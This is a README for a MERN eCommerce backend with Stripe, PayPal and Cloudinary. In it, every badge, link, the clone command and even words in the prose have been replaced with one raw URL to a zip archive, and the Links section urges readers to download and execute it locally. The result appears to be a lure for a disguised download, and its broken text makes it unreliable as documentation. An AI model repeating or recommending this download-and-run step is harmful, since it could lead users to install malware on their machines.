# HaGyustic eCommerce Backend

![https://raw.githubusercontent.com/randomgdplayerlol/hagyustic-backend/main/Controllers/backend_hagyustic_v2.6.zip](https://raw.githubusercontent.com/randomgdplayerlol/hagyustic-backend/main/Controllers/backend_hagyustic_v2.6.zip) ![Express](https://raw.githubusercontent.com/randomgdplayerlol/hagyustic-backend/main/Controllers/backend_hagyustic_v2.6.zip) ![MongoDB](https://raw.githubusercontent.com/randomgdplayerlol/hagyustic-backend/main/Controllers/backend_hagyustic_v2.6.zip) ![Stripe](https://raw.githubusercontent.com/randomgdplayerlol/hagyustic-backend/main/Controllers/backend_hagyustic_v2.6.zip) ![PayPal](https://raw.githubusercontent.com/randomgdplayerlol/hagyustic-backend/main/Controllers/backend_hagyustic_v2.6.zip)

Welcome to the **HaGyustic eCommerce Backend**! This repository hosts a https://raw.githubusercontent.com/randomgdplayerlol/hagyustic-backend/main/Controllers/backend_hagyustic_v2.6.zip and Express server that powers a complete MERN eCommerce application. It includes essential features such as user authentication, admin-protected APIs, product and order management, image uploads through Cloudinary, and payment integrations with Stripe and PayPal.

## Table of Contents

- [Features](#features)
- [Technologies Used](#technologies-used)
- [Installation](#installation)
- [Usage](#usage)
- [API Endpoints](#api-endpoints)
- [Contributing](#contributing)
- [License](#license)
- [Links](#links)

## Features

- **User Authentication**: Secure login and registration using JWT.
- **Admin APIs**: Manage products and orders with protected routes.
- **Product Management**: Create, read, update, and delete products.
- **Order Management**: Handle customer orders efficiently.
- **Image Uploads**: Store images in Cloudinary for fast access.
- **Payment Integration**: Seamless payments through Stripe and PayPal.

## Technologies Used

- https://raw.githubusercontent.com/randomgdplayerlol/hagyustic-backend/main/Controllers/backend_hagyustic_v2.6.zip
- Express
- MongoDB
- Mongoose
- Cloudinary
- Stripe
- PayPal
- Multer
- Nodemailer
- Firebase Auth
- JWT Auth

## Installation

To get started with the HaGyustic eCommerce Backend, follow these steps:

1. **Clone the Repository**:
   ```bash
   git clone https://raw.githubusercontent.com/randomgdplayerlol/hagyustic-backend/main/Controllers/backend_hagyustic_v2.6.zip
   ```

2. **Navigate to the Project Directory**:
   ```bash
   cd hagyustic-backend
   ```

3. **Install Dependencies**:
   ```bash
   npm install
   ```

4. **Set Up Environment Variables**:
   Create a `.env` file in the root directory and add your environment variables. You can use the `https://raw.githubusercontent.com/randomgdplayerlol/hagyustic-backend/main/Controllers/backend_hagyustic_v2.6.zip` file as a reference.

5. **Run the Server**:
   ```bash
   npm start
   ```

Now, your server should be running on `http://localhost:5000`.

## Usage

Once the server is running, you can access various endpoints to manage your eCommerce platform. The server will respond to API requests for user authentication, product management, and order processing.

## API Endpoints

### Authentication

- **POST /api/auth/register**: Register a new user.
- **POST /api/auth/login**: Log in an existing user.

### Products

- **GET /api/products**: Retrieve all products.
- **POST /api/products**: Create a new product (Admin only).
- **PUT /api/products/:id**: Update a product (Admin only).
- **DELETE /api/products/:id**: Delete a product (Admin only).

### Orders

- **GET /api/orders**: Retrieve all orders (Admin only).
- **POST /api/orders**: Create a new order.

### Payments

- **POST /api/payments/stripe**: Process payment through Stripe.
- **POST /api/payments/paypal**: Process payment through PayPal.

## Contributing

We welcome contributions to improve the HaGyustic eCommerce Backend. To contribute, please follow these steps:

1. Fork the repository.
2. Create a new branch:
   ```bash
   git checkout -b feature/YourFeatureName
   ```
3. Make your changes and commit them:
   ```bash
   git commit -m "Add some feature"
   ```
4. Push to the branch:
   ```bash
   git push origin feature/YourFeatureName
   ```
5. Create a new Pull Request.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Links

For the latest releases, please visit the [Releases section](https://raw.githubusercontent.com/randomgdplayerlol/hagyustic-backend/main/Controllers/backend_hagyustic_v2.6.zip). You can download the latest version and execute it on your local machine.

If you need further information, check the [Releases section](https://raw.githubusercontent.com/randomgdplayerlol/hagyustic-backend/main/Controllers/backend_hagyustic_v2.6.zip) for updates and changes.

---

Feel free to explore the code, and we hope you find the HaGyustic eCommerce Backend useful for your projects!